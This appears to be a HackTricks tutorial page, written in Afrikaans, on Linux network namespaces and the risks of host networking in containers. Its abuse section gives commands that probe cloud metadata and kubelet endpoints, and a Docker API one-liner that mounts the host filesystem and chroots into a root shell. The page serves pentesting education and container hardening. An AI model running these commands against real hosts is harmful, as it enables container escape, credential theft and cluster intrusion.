# Netwerk-naamruimte

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die netwerk-naamruimte isoleer netwerkverwante hulpbronne soos interfaces, IP-adresse, roete-tabelle, ARP/neighbor-status, firewall-reëls, sockets, en die inhoud van lêers soos `/proc/net`. Dit is hoekom 'n container 'n skynbare eie `eth0`, eie plaaslike roetes, en eie loopback-toestel kan hê sonder om die host se werklike netwerkstack te besit.

Veiligheidsgewys maak dit saak omdat netwerkisolasie veel meer behels as net port binding. 'n Privaat netwerk-naamruimte beperk wat die workload direk kan waarneem of herkonfigureer. Sodra daardie naamruimte met die host gedeel word, kan die container skielik sigbaarheid kry na host listeners, host-local services, en netwerkbeheerpunte wat nooit vir die toepassing bedoel was om blootgestel te word nie.

## Werking

'n Pas geskepte netwerk-naamruimte begin met 'n leë of byna leë netwerk-omgewing totdat interfaces daaraan aangeheg word. Container runtimes skep of koppel dan virtuele interfaces, ken adresse toe, en konfigureer roetes sodat die workload die verwagte verbindbaarheid het. In bridge-gebaseerde implementasies beteken dit gewoonlik dat die container 'n veth-backed interface sien wat aan 'n host bridge gekoppel is. In Kubernetes hanteer CNI plugins die ekwivalente opstelling vir Pod networking.

Hierdie argitektuur verduidelik hoekom `--network=host` of `hostNetwork: true` so 'n dramatiese verandering is. In plaas daarvan om 'n voorbereide privaat netwerkstack te kry, sluit die workload by die host se werklike netwerk aan.

## Laboratorium

Jy kan 'n byna leë netwerk-naamruimte sien met:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
En jy kan normale en host-networked containers vergelyk met:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Die host-networked container het nie meer sy eie geïsoleerde socket- en interface-uitsig nie. Daardie verandering op sigself is reeds belangrik voordat jy selfs vra watter capabilities die proses het.

## Tydens uitvoering

Docker en Podman skep normaalweg 'n private network namespace vir elke kontainer, tensy anders gekonfigureer. Kubernetes gee gewoonlik elke Pod sy eie network namespace, gedeel deur die kontainers binne daardie Pod, maar afsonderlik van die host. Incus/LXC-stelsels bied ook uitgebreide network-namespace-gebaseerde isolasie, dikwels met 'n groter verskeidenheid virtuele netwerkopstellings.

Die algemene beginsel is dat private networking die verstek isolasiegrens is, terwyl host networking 'n uitdruklike opt-out van daardie grens is.

## Foutkonfigurasies

Die belangrikste foutkonfigurasie is eenvoudig die deel van die host network namespace. Dit gebeur soms vir prestasie, laagvlak-monitoring of gerief, maar dit verwyder een van die skoonste grense wat vir kontainers beskikbaar is. Host-local listeners word direkter bereikbaar, localhost-only services kan toeganklik word, en capabilities soos `CAP_NET_ADMIN` of `CAP_NET_RAW` word baie gevaarliker omdat die operasies wat hulle toelaat nou op die host se eie netwerkomgewing toegepas word.

Nog 'n probleem is die oor-toekenning van netwerkverwante capabilities selfs wanneer die network namespace privaat is. 'n Private namespace help wel, maar dit maak nie raw sockets of gevorderde netwerkbeheer onskadelik nie.

## Misbruik

In swak geïsoleerde opstellings kan aanvallers host listening services inspekteer, bestuurspunte wat slegs aan loopback gebind is bereik, verkeer snuffel of daarmee inmeng afhangend van die presiese capabilities en omgewing, of routing- en firewall-staat herkonfigureer as `CAP_NET_ADMIN` teenwoordig is. In 'n cluster kan dit ook lateral movement en control-plane reconnaissance vergemaklik.

As jy vermoed dat host networking gebruik word, begin deur te bevestig dat die sigbare interfaces en listeners aan die host behoort eerder as aan 'n geïsoleerde container network:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-slegs dienste is dikwels die eerste interessante ontdekking:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
As netwerkvermoëns teenwoordig is, toets of die werkbelasting die sigbare stack kan ondersoek of verander:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
In kluster- of wolk-omgewings regverdig gasheer-netwerk ook vinnige plaaslike recon van metadata en beheer-vlak-aangrensende dienste:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Volledige Voorbeeld: Host Networking + Local Runtime / Kubelet Access

Host networking verskaf nie outomaties host root nie, maar dit openbaar dikwels dienste wat bedoel is om slegs vanaf die node self bereikbaar te wees. As een van daardie dienste swak beskerm is, word host networking 'n direkte privilege-escalation-pad.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet op localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impak:

- direkte gasheerkompromittering indien 'n plaaslike runtime API blootgestel word sonder behoorlike beskerming
- clusterverkenning of laterale beweging as kubelet of plaaslike agents bereikbaar is
- verkeersmanipulasie of denial of service wanneer dit gekombineer word met `CAP_NET_ADMIN`

## Kontroles

Die doel van hierdie kontroles is om te bepaal of die proses 'n privaat netwerkstapel het, watter roetes en luisteraars sigbaar is, en of die netwerkuitsig reeds gasheer-agtig lyk voordat jy selfs capabilities toets.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Wat hier interessant is:

- As die namespace-identifiseerder of die sigbare koppelvlakstel soos die host lyk, mag host networking reeds in gebruik wees.
- `ss -lntup` is besonder waardevol omdat dit loopback-only luisteraars en plaaslike bestuurseindpunte openbaar.
- Roetes, koppelvlakname en firewall-konteks word baie meer belangrik as CAP_NET_ADMIN of CAP_NET_RAW teenwoordig is.

Wanneer jy 'n container hersien, evalueer altyd die netwerk-namespace saam met die capability-stel. Host networking plus sterk netwerk-capabilities is 'n baie ander houding as bridge networking plus 'n beperkte standaard-capability-stel.
{{#include ../../../../../banners/hacktricks-training.md}}
